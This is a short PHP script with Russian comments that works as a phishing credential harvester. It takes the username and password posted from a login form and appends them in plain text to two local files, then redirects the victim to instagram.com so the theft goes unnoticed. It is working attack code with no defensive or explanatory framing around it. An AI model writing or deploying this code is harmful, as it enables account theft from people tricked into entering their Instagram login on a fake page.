<?php

$f = fopen("myfile.txt", "a"); // Открываем файл в режиме записи при этом указатель сдвигается на  последний байт файла
fwrite($f, "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n",); // Запись в файл
fclose($f); //Закрываем файл
file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://instagram.com');
exit();
